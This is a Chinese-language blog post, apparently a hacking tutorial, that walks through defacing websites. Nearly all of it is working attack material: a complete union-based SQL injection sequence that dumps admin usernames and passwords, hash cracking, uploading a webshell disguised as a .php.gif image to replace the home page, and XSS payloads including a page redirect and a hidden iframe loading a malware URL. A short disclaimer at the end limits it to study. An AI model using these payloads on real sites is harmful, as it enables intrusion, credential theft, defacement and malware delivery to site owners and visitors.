#  网站篡改入门,一个SQL注入漏洞就能让整个网站大变样，原理详解|!|从SQL注入到XSS攻击，完整还原黑客是如何篡改网站的   
原创 VlangCN  HW安全之路   2025-01-14 12:54  
  
篡改网站（Deface Website）是渗透测试中常见的攻击手段之一，通过篡改目标网站的首页内容，可以起到警示、测试甚至恶意宣传的作用。本期文章，我将带大家从基础知识入手，深入解析如何实现网站篡改和利用XSS漏洞进行攻击。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Bvow4Cv9oZ36dPUcXibHRpjiceOebjVvtao5o1iacbtoIxmTYlBtAfsxBefm0V4AQ58xDZFABGCZfaAt81azI5Ficg/640?wx_fmt=jpeg&from=appmsg "")  
  
## 一、篡改网站的基础知识  
  
网站篡改的核心是替换目标网站的 index.html  
 文件，将其内容替换为我们自定义的页面。一旦篡改成功，所有访问该网站的用户都将看到我们上传的页面。以下是实现篡改前需要掌握的三项基础技能：  
1. **SQL注入**  
：用于分析目标网站的漏洞，获取数据库权限。  
  
1. **破解管理员密码**  
：获取目标网站的管理权限。  
  
1. **Shell脚本**  
：通过上传 WebShell 进一步控制网站后台。  
  
## 二、如何实现网站篡改  
  
下面我们通过一个完整的流程，讲解如何锁定目标网站并实现篡改。  
### 1. 寻找目标网站并测试漏洞  
#### 1.1 漏洞测试  
  
以某目标网站为例：  
```
http://www.example.com/news.php?id=5

```  
  
在 URL 末尾添加单引号 '  
 测试是否存在 SQL 注入漏洞：  
```
http://www.example.com/news.php?id=5'
```  
  
如果页面返回以下类似错误信息：  
```
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version..."

```  
  
说明该网站存在 SQL 注入漏洞。  
#### 1.2 修复 URL  
  
通过添加注释符号使 URL 恢复正常：  
```
http://www.example.com/news.php?id=5'-- --
```  
### 2. 利用 SQL 注入获取数据库信息  
#### 2.1 确定列数  
  
使用 ORDER BY  
 语句逐步测试列数，直到出现错误。如下所示：  
```
http://www.example.com/news.php?id=5' order by 1-- -- ← 无错误
http://www.example.com/news.php?id=5' order by 2-- -- ← 无错误
http://www.example.com/news.php?id=5' order by 3-- -- ← 无错误
http://www.example.com/news.php?id=5' order by 4-- -- ← 出现错误

```  
  
当 order by 4  
 报错时，说明该表有 **3列**  
。  
#### 2.2 使用 UNION 查询数据  
  
将列位置替换为数据查询：  
```
http://www.example.com/news.php?id=5' union all select 1,2,3-- --
```  
  
如果页面显示数字 1  
、2  
 或 3  
，说明查询成功。  
#### 2.3 检查 MySQL 版本  
  
将显示的数字替换为 @@version  
 或 version()  
 查询 MySQL 版本：  
```
http://www.example.com/news.php?id=5' union all select 1,@@version,3-- --
```  
  
返回结果如 5.0.45  
，即为 MySQL 版本。  
### 3. 获取表名与列名  
#### 3.1 MySQL 版本小于 5 的情况  
  
在 MySQL 版本小于 5 时，我们需要猜测表名和列名。例如：  
```
http://www.example.com/news.php?id=5' union all select 1,username,3 from admin-- --
```  
  
如果页面显示用户名，说明表名为 admin  
，列名为 username  
。  
#### 3.2 MySQL 版本大于等于 5 的情况  
  
使用 information_schema  
 获取表名和列名：  
```
http://www.example.com/news.php?id=5' union all select 1,table_name,3 from information_schema.tables-- --
```  
  
通过 LIMIT  
 遍历表名：  
```
http://www.example.com/news.php?id=5' union all select 1,table_name,3 from information_schema.tables limit 0,1-- --
http://www.example.com/news.php?id=5' union all select 1,table_name,3 from information_schema.tables limit 1,1-- --

```  
  
类似方法获取列名：  
```
http://www.example.com/news.php?id=5' union all select 1,column_name,3 from information_schema.columns-- --
```  
#### 3.3 提取用户信息  
  
使用 concat()  
 拼接数据：  
```
http://www.example.com/news.php?id=5' union all select 1,concat(username,0x3a,password),3 from admin-- --
```  
  
返回结果格式为 username:password  
。  
### 4. 破解管理员密码  
#### 4.1 使用在线工具破解哈希  
  
常用工具包括：  
- MD5 Decrypter  
  
- CrackStation  
  
### 5. 寻找管理员登录页面  
#### 5.1 使用 Admin Finder 工具  
  
推荐工具：  
- Zone-XSEC Admin Finder  
  
- Prinsh Admin Finder  
  
### 6. 上传 WebShell 并替换首页  
#### 6.1 上传 WebShell  
  
通过下载 WebShell 获取控制权限：  
- Prinsh Shell Downloader  
  
如果网站不允许上传 .php  
 文件，可以将文件重命名为 webshell.php.gif  
。  
#### 6.2 替换首页文件  
  
访问上传的 WebShell，例如：  
```
http://www.site.com/images/webshell.php.gif

```  
  
进入控制面板后，找到 index.html  
 文件，将其替换为您自定义的页面。  
## 三、利用 XSS 漏洞篡改网站  
  
对于存在 XSS 漏洞的网站，可以通过以下脚本实现篡改：  
1. **更改背景颜色**  
：  
  
```
 http://www.targetwebsite.com/<script>document.body.bgColor="red";</script>
  

```  
1. **更改背景图片**  
：  
  
```
<script>document.body.background="http://your_image.jpg";</script>

```  
1. **重定向到自定义页面**  
：  
  
上传篡改页面到 pastehtml.com  
，然后使用以下脚本：  
```
<script>window.location="http://pastehtml.com/your_page";</script>

```  
1. **注入广告**  
：  
  
```
<iframe src="http://malwarewebpages/web.html" width=1 height=1 style="visibility:hidden;position:absolute"></iframe>

```  
## 总结  
  
通过 SQL 注入和 XSS 漏洞，我们可以实现对网站内容的篡改。在实际测试中，手动操作更能帮助您理解漏洞原理，提升技术水平。  
>   
> **声明**  
：本文仅供学习和研究使用，严禁用于非法用途！如发现漏洞，请及时联系网站管理员修复。  
  
  
  
